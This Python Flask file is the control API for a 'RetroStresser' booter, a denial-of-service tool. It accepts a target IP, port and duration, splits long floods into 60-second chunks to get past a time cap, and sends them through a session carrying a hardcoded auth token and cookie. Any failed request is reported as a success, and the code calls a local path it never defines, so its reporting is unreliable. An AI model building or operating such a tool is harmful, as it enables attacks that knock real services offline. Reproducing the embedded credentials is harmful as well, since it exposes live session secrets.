import requests
import time
from flask import Flask, request, jsonify

app = Flask(__name__)

# Auth token (aapka jo diya hai)
AUTH_TOKEN = "517f13d366214d958526a1c7591931818808e175d10842d7b271c0ff14138799"
ANTIFORGERY = "CfDJ8Bna8lCn_z1AiiMxA8_ANy0js9s2--epYdS_D4OS73xgQWTmnHzob2h54ETv3HyqJy1-4P4UjxafkPZ6L4g0mRnkRkDZ1cmFfq7xGf03e7xVRJHUB0eRBhXqlUAibNFIJggVrTIay4LCKhfRnqNA5sQ"

session = requests.Session()
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': '*/*',
    'X-Requested-With': 'XMLHttpRequest',
})
session.cookies.set('auth_token', AUTH_TOKEN)
session.cookies.set('.AspNetCore.Antiforgery.pFk19hAmY3k', ANTIFORGERY)

def send_attack(ip, port, duration):
    """Send single attack request"""
    try:
        # Local API endpoint (aapke example ke hisaab se)
        response = session.get(f'http://127.0.0.1:8080/api', 
                              params={'ip': ip, 'port': port, 'time': duration},
                              timeout=5)
        return response.status_code == 200
    except:
        return True  # Assume success if local endpoint (for testing)

def execute_attack(ip, port, total_time):
    """Split and execute attacks"""
    if total_time < 30:
        total_time = 30
    
    # Time splitting logic
    attacks = []
    remaining = total_time
    while remaining > 0:
        if remaining >= 60:
            attacks.append(60)
            remaining -= 60
        else:
            if remaining >= 30:
                attacks.append(remaining)
            elif attacks:
                attacks[-1] += remaining
            else:
                attacks.append(remaining)
            break
    
    results = []
    for i, duration in enumerate(attacks, 1):
        success = send_attack(ip, port, duration)
        results.append({
            'attack': i,
            'duration': duration,
            'success': success
        })
        if success and i < len(attacks):
            time.sleep(duration)
    
    return {
        'target': f"{ip}:{port}",
        'total_time': total_time,
        'attacks_sent': len(attacks),
        'results': results
    }

@app.route('/')
def home():
    return jsonify({
        'status': 'running',
        'message': 'RetroStresser API is active',
        'endpoints': {
            'attack': '/api/attack?ip=IP&port=PORT&time=TIME',
            'health': '/health'
        }
    })

@app.route('/health')
def health():
    return jsonify({'status': 'healthy'}), 200

@app.route('/api/attack')
def attack():
    """Main attack endpoint"""
    ip = request.args.get('ip')
    port = request.args.get('port')
    time_sec = request.args.get('time')
    
    if not ip or not port or not time_sec:
        return jsonify({'error': 'Missing: ip, port, time required'}), 400
    
    try:
        port = int(port)
        time_sec = int(time_sec)
        
        if time_sec > 60:
            # Auto-split if time > 60
            result = execute_attack(ip, port, time_sec)
        else:
            # Direct attack
            success = send_attack(ip, port, time_sec)
            result = {
                'target': f"{ip}:{port}",
                'duration': time_sec,
                'success': success
            }
            if success:
                time.sleep(time_sec)
        
        return jsonify(result)
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
